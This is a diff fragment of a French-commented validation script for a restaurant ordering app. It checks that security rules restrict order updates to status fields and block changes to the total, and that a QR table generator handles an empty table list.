+  // Test 4.3: Restriction stricte des modifications d'ordres KDS
+  assert(rulesContent.includes('affectedKeys().hasOnly([\'status\', \'statusUpdatedAt\', \'kitchenNotes\'])'), 'Mise à jour de commande limitée strictement aux statuts opérationnels');
+  assert(rulesContent.includes('incoming().totalAmount == existing().totalAmount'), 'Empêche toute altération du montant après commande');
+
+  // ==========================================================================
+  // SECTION 5 : CORRECTION E — Tables réelles uniquement dans le générateur QR
+  // ==========================================================================
+  console.log('\n--- SECTION 5 : CORRECTION E — Générateur QR sans tables factices ---');
+
+  const qrViewContent = fs.readFileSync(path.resolve('src/components/restaumax/TableQrGeneratorView.tsx'), 'utf-8');
+
+  // Test 5.1: Suppression de DEFAULT_SAMPLE_TABLES
+  assert(!qrViewContent.includes('DEFAULT_SAMPLE_TABLES'), 'DEFAULT_SAMPLE_TABLES définitivement éradiqué du composant');
+
+  // Test 5.2: Présence d'un état vide explicite
+  assert(qrViewContent.includes('tableList.length === 0'), 'Gère explicitement la collection de tables vide');
+  assert(qrViewContent.includes('Aucune table configurée'), 'Affiche un message clair en cas d\'absence de tables');
 
   // ==========================================================================
   // BILAN GÉNÉRAL LOT 2
   // ==========================================================================
   console.log('\n====================================================');
-  console.log(`RÉSULTATS LOT 2 : ${passedTests}/${totalTests} tests réussis (${failedTests} échecs)`);
+  console.log(`RÉSULTATS VALIDATION LOT 2 : ${passedTests}/${totalTests} tests réussis (${failedTests} échecs)`);
   console.log('====================================================');
 
   if (failedTests > 0) {
